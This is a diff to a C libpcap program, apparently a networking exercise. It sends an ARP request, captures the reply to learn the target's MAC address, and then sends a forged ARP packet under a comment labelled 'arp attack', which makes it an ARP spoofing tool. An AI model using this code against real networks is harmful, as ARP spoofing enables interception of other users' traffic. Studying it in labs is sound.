@@ -65,7 +65,7 @@ int main(int argc, char **argv)
     eth_Header ethhd;
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    u_char packet[100];
+    u_char packet[42];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 
     if (handle == NULL) {
@@ -84,7 +84,9 @@ int main(int argc, char **argv)
 
     u_char ips[4];
     for(int i=0; i<4; i++)
-        ips[i] = inet_addr(argv[2]) >> (8 * i) & 0xff;
+    {    ips[i] = inet_addr(argv[2]) >> (8 * i) & 0xff;
+        printf("%02x \n", ips[i]);
+    }
     u_char ipd[4];
     for(int i=0; i<4; i++)
         ipd[i] = inet_addr(argv[3]) >> (8 * i) & 0xff;
@@ -113,7 +115,7 @@ int main(int argc, char **argv)
     memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
     for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
     printf("\n");
-    if(pcap_sendpacket(handle, packet, 100) != 0)
+    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
     {
         printf("send error");
         return 0;
@@ -121,18 +123,32 @@ int main(int argc, char **argv)
     printf("Wow!!");
 
     //arp reply
-    struct pcap_pkthdr* header;
-    const u_char* pacre;
-    int res = pcap_next_ex(handle, &header, &pacre);
-    printf("%u bytes captured\n", header->caplen);
+    while(1)
+    {
+        struct pcap_pkthdr* header;
+        const u_char* pacre;
+        u_char smac[6];
+        pcap_next_ex(handle, &header, &pacre);
+        printf("%u bytes captured\n", header->caplen);
+        if(pacre[12] == 0x08 && pacre[13] == 0x06)
+        {
+            printf("ARP packet\n");
+            if(pacre[20] == 0x00 && pacre[21] == 0x02)
+            {
+                printf("ARP Reply packet");
+                smac[0] = pacre[22];
+                smac[1] = pacre[23];
+                smac[2] = pacre[24];
+                smac[3] = pacre[25];
+                smac[4] = pacre[26];
+                smac[5] = pacre[27];
+                break;
+            }
+        }
+    }
     //index 22
-    u_char smac[6];
-    smac[0] = pacre[22];
-    smac[1] = pacre[23];
-    smac[2] = pacre[24];
-    smac[3] = pacre[25];
-    smac[4] = pacre[26];
-    smac[5] = pacre[27];
+
+
 
     //arp attack
 //    u_char gmac[6] = {0x52, 0x54, 0x00, 0x12, 0x35, 0x02}; //gateway mac 52:54:00:12:35:02
@@ -155,7 +171,7 @@ int main(int argc, char **argv)
     memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
     for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
     printf("\n");
-    if(pcap_sendpacket(handle, packet, 100) != 0)
+    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
     {
         printf("send error");
         return 0;
